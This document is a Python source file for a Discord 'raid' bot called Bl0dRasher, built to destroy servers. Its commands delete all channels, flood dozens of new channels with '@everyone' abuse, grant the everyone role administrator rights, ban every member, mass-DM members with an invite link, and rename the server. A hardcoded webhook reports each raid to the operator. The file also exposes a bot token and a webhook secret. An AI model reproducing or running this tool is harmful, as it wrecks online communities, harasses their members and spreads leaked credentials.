import datetime
import discord
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed
from Resources.data import database
from io import open

# Change the information
token = "NzY5MjMwODcxMDEzNzUyODQz.X5MAEdKnr81y_9yqPmZNul84TXh5eLqk"
prefix = "$"


##### If database is true, new functions of the bot will be used, such that only users registered in the database can use it.
database = True


##### WEBHOOK CONFIGURATION:
# If webhook is True when somebody attack a server get notification with user and server id
webhook = True
webhook_url = "https://discordapp.com/api/webhooks/780641361468719136/95kC-ZgYntSOgxQ8SjDt6t_oKFc1DvX3xCBC5UuUG6TywQjkFTL-lZOj6ztDmnBnb8Tj"
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
webhook_color = 0xb81c00
# Only link
webhook_image = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"


##### CHANGE COMMAND CONFIG:
guild_name = "Raided By Blood Moon"
guild_picture = "Pic/Blood_Moon.jpg"


##### CREATE CHANNELS CONFIG:
# As long as the message is True, normal messages will be sent; if it becomes False, it will send embeds
message = False
name_channel = "raided-by-bloodmoon"
# Number of channels that the bot will create.
num_channels = 50
# Number of messages for each channel created. It doesn't work if you use a embed type message.
num_messages = 5
# Message to send in the created channel
message_channels = "@everyone Fucked by Blood Moon."
## Embed config:
embed_title = "Raided by Blood Moon."
embed_desc = "Server fucked by Blood Moon."
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
embed_color = 0xb81c00
embed_link = "https://discord.gg/test"
embed_picture = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"


##### DM CONFIG:
# As long as embed_dm is True an embed will be sent instead of a normal message.
embed_dm = True
embed_titledm = "Raided By Blood Moon."
embed_descdm = "Server fucked by Blood Moon."
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
embed_colordm = 0xb81c00
# Group link to promote in the raid
embed_linkdm = "https://discord.gg/test"
embed_picturedm = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"
# The message to be sent when "embed_dm" is false
message_dm = "A server where you were was fucked up by Blood Moon."


# For get members with de new API.
intents = discord.Intents.default()
intents.members = True

# Define prefix
client = commands.Bot(command_prefix = prefix, intents=intents)
client.remove_command("help")

# Open image
with open(guild_picture, 'rb') as f:
    guild_icon = f.read()

def send_webhook(webhook_color, command, webhook_url, webhook_image, username, user_id, guildname, guild_id, guild_picture):
    dt = datetime.datetime.now()
    date = dt.strftime("%d/%m/%Y, %m:%M:%S")
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title="New Raid", description=f"A new raid took place at: {date}", color=webhook_color)
    embed.set_thumbnail(url=webhook_image)
    embed.add_embed_field(name="Attacked Server:", value=f"Name: {guildname}\nID: {guild_id}", inline=False)
    embed.add_embed_field(name="Name of Attacker", value=f"Name: {username}\nID: {user_id}", inline=False)
    embed.add_embed_field(name="Command Executed", value=f'The command executed was "{command}"', inline=False)
    embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
    webhook.add_embed(embed)
    response = webhook.execute()

# If see this message the bot is correctly connected
@client.event
async def on_ready():
    print("The bot is correctly connected.")

# Show users on database
@client.command(pass_context=True)
async def show(ctx, database=database):
    if database == True:
        from Resources.data import database
        user_id = ctx.author.id
        adminlist = open("Resources/List/adminlist.txt")
        admin = False
        username = f"{ctx.author.name}#{ctx.author.discriminator}"
        whiteusers = adminlist.readlines()
        for usern in whiteusers:
            if int(user_id) == int(usern):
                print(str(usern))
                admin = True
                break
            else:
                print(f"not user")
                pass
        if admin == True:
            database.show()
            await ctx.send(file=discord.File("Resources/user_data.txt"))
            database.delete_file()
        elif admin == False:
            await ctx.send("``You do not have permissions on the bot``")
        else:
            print("Unknown Error.")
    else:
        await ctx.send("``Database is not configured.``")


@client.command()
async def unban(ctx, user_ban_id = None, database=database):
    if database == True:
        try:
            from Resources.data import database
            user_id = ctx.author.id
            adminlist = open("Resources/List/adminlist.txt")
            whiteusers = adminlist.readlines()
            verify = False
            for user in whiteusers:
                if whiteusers:
                    if int(user) == (user_ban_id):
                        await ctx.send("``You don't have permissions.``")
                        verify = True
                        break
                    if verify == True:
                        break
                    if int(user_id) == int(user) and verify == False:
                        try:
                            blist = open("Resources/List/blacklist.txt", "r")
                            blacklist = blist.readlines()
                            enc = False
                            result = ""
                            for b in blacklist:
                                if int(b) == int(user_ban_id):
                                    enc = True
                                elif b == "" or b == " " or b == None or b == "\\n" or b == "\n":
                                    pass
                                else:
                                    result += f"{b}\n"
                            if enc == True:
                                blist.close()
                                wlist = open("Resources/List/blacklist.txt", "w")
                                wlist.write(result)
                                wlist.close()
                                await ctx.send("``The user has been unbanned.``")
                            
                            else:
                                await ctx.send("``User not found.``")
                        except:
                            print("Prueba")
                    else:
                        await ctx.send("``You don't have permissions.``")
                else:
                    print("Unexpected Error")
        except:
            print("Unexpected Error")
    else:
        await ctx.send("``Database is not configured.``")
# Ban user from using this bot
@client.command()
async def banlist(ctx, user_ban_id = None, database=database,):
    if database == True:
        try:
            from Resources.data import database
            user_id = ctx.author.id
            adminlist = open("Resources/List/adminlist.txt")
            whiteusers = adminlist.readlines()
            verify = False
            for user in whiteusers:
                if whiteusers:
                    if int(user) == int(user_ban_id):
                        await ctx.send("``You don't have permissions.``")
                        verify = True
                        break
                    if verify == True:
                        break
                    if int(user_id) == int(user) and verify == False:
                        blist = open("Resources/List/blacklist.txt", "r")
                        blacklist = blist.readlines()
                        admin = True
                        result = ""
                        for b in blacklist:
                            if blacklist:
                                if str(b) == str(user_ban_id):
                                    master = b
                                    admin = False
                                    break 
                                else:
                                    result += f"{b}"
                                    admin = True
                            else:
                                await ctx.send("``Error when creating the list.``")
                        if admin == False:
                            await ctx.send("``This user has been banned``")
                        if admin == True:
                            await ctx.send(f"``{user_ban_id} was banned from users.``")
                            if blacklist:
                                result += f"\n{user_ban_id}"
                            else:
                                result += f"{user_ban_id}"
                            blacklst = open("Resources/List/blacklist.txt", "w")
                            if result == None or result == "" or result == "":  
                                print("Not added")
                            else:
                                blacklst.write(result)
                            blacklst.close()
                            blist.close()
                            try:
                                database.delete(user_id=user_ban_id)
                            except:
                                print("")                        
                    else:
                        await ctx.send("``You don't have permissions.``")
                else:
                    print("Error")
        except:
            await ctx.send("``You did not specify the id to be banned or the database was not configured. Use the command check.``")
    else:
        await ctx.send("``Database is not configured.``")

# Register user into database.
@client.command()
async def register(ctx, database=database):
    if database == True:
        try:
            from Resources.data import database
            username = f"{ctx.author.name}#{ctx.author.discriminator}"
            user_id = ctx.author.id
            blackld = open("Resources/List/blacklist.txt", "r")
            blackusers = blackld.readlines()
            apass = True
            for b in blackusers:
                if str(b) == str(user_id):
                    print(b)
                    apass = False
            
            if apass == False:
                await ctx.send("``You have been banned, you're not going to be able to register anymore.``")
            elif apass == True:
                try:
                    database.register(user_id=user_id, username=username)
                    await ctx.send(f"``The user {username} was registred correctly.``")
                except:
                    await ctx.send("``You are already a user.``")
            else:
                print("Unexpected Error.")
        except:
            await ctx.send("``The database was not configured.``")
    else:
        await ctx.send("``Database is not configured.``")

# Check 
@client.command(pass_context=True)
async def check(ctx, database=database):
    if database == True:
        try:
            from Resources.data import database
            user_id = ctx.author.id
            if database.check(user_id) == True:
                await ctx.send("``The user is registred.``")
            elif database.check(user_id) == False:
                await ctx.send("``The user is not registred.``")
            else:
                print("Unexpected Error.")
        except:
            await ctx.send("``Database is bad configured.``")
    else:
        await ctx.send("``The database is not configured.``")

# Delete channels with this command
@client.command()
async def delete(ctx, channel_name=name_channel, database=database, webhook=webhook):
    if database == True:
        from Resources.data import database
        user_id = ctx.author.id
        if database.check(user_id) == True:
            if webhook == True:
                username = f"{ctx.author.name}#{ctx.author.discriminator}"
                user_id = ctx.author.id
                server_id = ctx.guild.id   
                server = ctx.guild.name
                send_webhook(webhook_color=webhook_color, webhook_image=webhook_image, webhook_url=webhook_url, username=username, user_id=user_id, guildname=server, guild_id=server_id, guild_picture=guild_picture, command="delete")
                
            for channelN in ctx.guild.channels:
                await channelN.delete()
            await ctx.guild.create_text_channel(channel_name)
        
        elif database.check(user_id) == False:
            await ctx.send("``The user is not registred.``")
        else:
            print("Unexpected Error.")
    else:
        if webhook == True:
            username = f"{ctx.author.name}#{ctx.author.discriminator}"
            user_id = ctx.author.id
            server_id = ctx.guild.id   
            server = ctx.guild.name
            send_webhook(webhook_color=webhook_color, webhook_image=webhook_image, webhook_url=webhook_url, username=username, user_id=user_id, guildname=server, guild_id=server_id, guild_picture=guild_picture, command="delete")
            
        for channelN in ctx.guild.channels:
            await channelN.delete()
        await ctx.guild.create_text_channel(channel_name)
    
# Create channels with this command

@client.command()
async def create(ctx, database=database, num_messages=num_messages, guild_icon=guild_icon, embed_picture=embed_picture, channel_name=name_channel, num_channels=num_channels, message_channels=message_channels, message_b=message, embedtitle=embed_title, embeddesc=embed_desc, embed_color=embed_color, embed_link=embed_link):
    if database == True:
        from Resources.data import database
        user_id = ctx.author.id 
        if database.check(user_id) == True:
            if webhook == True:
                username = f"{ctx.author.name}#{ctx.author.discriminator}"
                user_id = ctx.author.id
                server_id = ctx.guild.id   
                server = ctx.guild.name
                send_webhook(webhook_color=webhook_color, webhook_image=webhook_image, webhook_url=webhook_url, username=username, user_id=user_id, guildname=server, guild_id=server_id, guild_picture=guild_picture, command="create")
            if message_b == True:
                num_messages += 1
                num_channels += 1
                for channel in range(1,num_channels):
                    await ctx.guild.create_text_channel(channel_name)
                    guild = ctx.guild.channels[channel]
                    for message in range(1,num_messages):
                        await guild.send(message_channels)
            elif message_b == False:
                num_channels += 1
                embed = discord.Embed(title=embedtitle, embed_picture=embed_picture, description=embeddesc, color=embed_color)
                embed.set_thumbnail(url=embed_picture)
                embed.add_field(name="Join Now", value=embed_link)
                embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
                for channel in range(1, num_channels):
                    await ctx.guild.create_text_channel(channel_name)
                    guild = ctx.guild.channels[channel]
                    await guild.send(embed=embed)
            else:
                print("Error: message_b is not declared")
        elif database.check(user_id) == False:
            await ctx.send("``The user is not registred.``")
        else:
            print("Unexpected Error")
    else:
        if webhook == True:
            username = f"{ctx.author.name}#{ctx.author.discriminator}"
            user_id = ctx.author.id
            server_id = ctx.guild.id   
            server = ctx.guild.name
            send_webhook(webhook_color=webhook_color, webhook_image=webhook_image, webhook_url=webhook_url, username=username, user_id=user_id, guildname=server, guild_id=server_id, guild_picture=guild_picture, command="create")
        if message_b == True:
            num_channels += 1
            for channel in range(1,num_channels):
                await ctx.guild.create_text_channel(channel_name)
                for message in range(1,5):
                    guild = ctx.guild.channels[channel]
                    await guild.send(message_channels)
        elif message_b == False:
            num_channels += 1
            embed = discord.Embed(title=embedtitle, embed_picture=embed_picture, description=embeddesc, color=embed_color)
            embed.set_thumbnail(url=embed_picture)
            embed.add_field(name="Join Now", value=embed_link)
            embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
            for channel in range(1, num_channels):
                await ctx.guild.create_text_channel(channel_name)
                guild = ctx.guild.channels[channel]
                await guild.send(embed=embed)
        else:
            print("Error: message_b is not declared")

# Set everyone with admin perms
@client.command()
async def allahmode(ctx, database=database):
    if database == True:
        from Resources.data import database
        user_id = ctx.author.id
        if database.check(user_id) == True:
            role = ctx.guild.default_role
            perms = role.permissions
            perms.administrator = True
            await role.edit(permissions=perms)
        elif database.check(user_id) == False:
            await ctx.send("``The user is not registred.``")
        else:
            print("Uknown Error")
    else:
        role = ctx.guild.default_role
        perms = role.permissions
        perms.administrator = True
        await role.edit(permissions=perms)

# Change the name of server and picture
@client.command()
async def change(ctx, guild_name=guild_name, guild_picture=guild_icon, database=database):
    if database == True:
        from Resources.data import database
        user_id = ctx.author.id
        if database.check(user_id) == True:
            guild = ctx.guild
            await guild.edit(name=guild_name, icon=guild_picture)
        elif database.check(user_id) == False:
            await ctx.send("``The user is not registred.``")
        else:
            print("Uknown Error")
    else:
        guild = ctx.guild
        await guild.edit(name=guild_name, icon=guild_picture)

# Ban all members on server
@client.command()
async def ban(ctx, database=database):
    if database == True:
        from Resources.data import database
        user_id = ctx.author.id
        if database.check(user_id) == True:
            no = f"{ctx.message.author.name}#{ctx.message.author.discriminator}"
            for member in ctx.guild.members:
                try:
                    if member != ctx.message.author and member != ctx.message.guild.me:
                        await member.ban()
                except: 
                    print("Error: The user has admin perms.")
        elif database.check(user_id) == False:
            await ctx.send(f"``The user is not registred.``")
        else:
            print("Unexpected Error")
    else:
        no = f"{ctx.message.author.name}#{ctx.message.author.discriminator}"
        for member in ctx.guild.members:
            try:
                if member != ctx.message.author and member != ctx.message.guild.me:
                    await member.ban()
            except: 
                print("Error: The user has admin perms.")
                    

# Send DM to all members
@client.command()
async def dm(ctx, database=database, embed_picture=embed_picturedm, message_dm=message_dm, embed_dm=embed_dm, embedtitle=embed_titledm, embeddesc=embed_descdm, embed_color=embed_colordm, embed_link=embed_linkdm):
    if database == True:
        from Resources.data import database
        user_id = ctx.author.id
        if database.check(user_id) == True:
            if embed_dm == False:
                for member in ctx.guild.members:
                    try:
                        if member != ctx.message.author and member != ctx.message.guild.me:
                            await member.send(message_dm)
                    except:
                        print("Error: The user have DM blocked.")
            elif embed_dm == True:
                for member in ctx.guild.members:
                    try:
                        if member != ctx.message.author and member != ctx.message.guild.me:
                            embed = discord.Embed(embed_picture=embed_picture, title=embedtitle, description=embeddesc, color=embed_color)
                            embed.set_thumbnail(url=embed_picture)
                            embed.add_field(name="Join Now", value=embed_link)
                            embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
                            await member.send(embed=embed)
                    except:
                        print("Error: The user have DM blocked.")
        elif database.check(user_id) == False:
            await ctx.send("``The user is not registred.``")
        else:
            print("Unexpected error.")
    else:
        if embed_dm == False:
            for member in ctx.guild.members:
                try:
                    if member != ctx.message.author and member != ctx.message.guild.me:
                        await member.send(message_dm)
                except:
                    print("Error: The user have DM blocked.")
        elif embed_dm == True:
            for member in ctx.guild.members:
                try:
                    if member != ctx.message.author and member != ctx.message.guild.me:
                        embed = discord.Embed(embed_picture=embed_picture, title=embedtitle, description=embeddesc, color=embed_color)
                        embed.set_thumbnail(url=embed_picture)
                        embed.add_field(name="Join Now", value=embed_link)
                        embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
                        await member.send(embed=embed)
                except:
                    print("Error: The user have DM blocked.")

# Execute all commands at once
@client.command()
async def all(ctx):
    await allahmode(ctx)
    await delete(ctx)
    await dm(ctx)
    await change(ctx)
    await ban(ctx)
    await create(ctx)

# Help command in spanish
@client.command()
async def help_es(ctx):
    embed = discord.Embed(title="Ayuda", guild_icon=guild_icon, description="Lista de Comandos", color=0xb81c00)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429")
    embed.add_field(name=f"{prefix}all", value="Hace todos los comandos a la vez.", inline=False)
    embed.add_field(name=f"{prefix}delete", value="Borra todos los canales del servidor.", inline=False)
    embed.add_field(name=f"{prefix}create", value="Crea muchos canales en el servidor.", inline=False)
    embed.add_field(name=f"{prefix}dm", value="Manda un dm a cada uno de los miembros del servidor.", inline=False)
    embed.add_field(name=f"{prefix}change", value="Cambia la imagen del servidor y el nombre.")
    embed.add_field(name=f"{prefix}allahmode", value="Da administrador al rol everyone.", inline=False)
    embed.add_field(name=f"{prefix}ban", value="Banea a todos los miembros del servidor.", inline=False)
    embed.add_field(name=f"{prefix}register", value="Si el usuario tiene activa la base de datos del bot, este comando sirve para registrarse, si no estas registrado no podras usar los comandos", inline=False)
    embed.add_field(name=f"{prefix}check", value="Si el usuario tiene activa la base de datos del bot, este comando sirve para saber si estas registrado.", inline=False)
    embed.add_field(name=f"{prefix}show", value="Este comando sirve para ver los usuarios registrados al bot, solo puede ejecutarse si eres admin del bot.", inline=False)
    embed.add_field(name=f"{prefix}banlist ID", value="Este comando sirve para banear a una persona de la base de datos del bot.", inline=False)
    embed.add_field(name=f"{prefix}unban ID", value="Este comando sirve para desbanear a una persona de la base de datos del bot.", inline=False)
    embed.set_footer(text="Bl0dRasher - Created By Narchen#6666")
    await ctx.send(embed=embed)

# Help command
@client.command()
async def help(ctx, prefix=prefix):
    embed = discord.Embed(title="Help", description="Command List", color=0xb81c00)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429")
    embed.add_field(name=f"{prefix}all", value="Executes all the commands at the same time.", inline=False)
    embed.add_field(name=f"{prefix}delete", value="Deletes all the channels in the server.", inline=False)
    embed.add_field(name=f"{prefix}create", value="Creates a lot of channels in the server.", inline=False)
    embed.add_field(name=f"{prefix}dm", value="Sends DM's to each user in the server.", inline=False)
    embed.add_field(name=f"{prefix}change", value="Changes the server icon and the name.", inline=False)
    embed.add_field(name=f"{prefix}allahmode", value="Gives Admin Permissions to the everyone role.", inline=False)
    embed.add_field(name=f"{prefix}ban", value="Ban's all the users in the server.", inline=False)
    embed.add_field(name=f"{prefix}register", value="If the user has active the database of the bot, this command works for register, if you're not registered you're not be able to use the other commands.", inline=False)
    embed.add_field(name=f"{prefix}check", value="Checks if the user has active the database of the bot, this command checks if the user is registered. (Only works if you're registered)", inline=False)
    embed.add_field(name=f"{prefix}show", value="This command works to check the registered users in the bot. (Only works if you're registered)", inline=False)
    embed.add_field(name=f"{prefix}banlist ID", value="This command works to ban some user in the database of the bot. (Only works for Bot Administrators)", inline=False)
    embed.add_field(name=f"{prefix}unban ID", value="This command works for unban some user in the database of the bot. (Only works for Bot Administrators)", inline=False)
    embed.set_footer(text="Bl0dRasher - Created By Narchen#6666 | Translated by Neversoft#6666")
    await ctx.send(embed=embed)

# Log into bot with token
client.run(token)
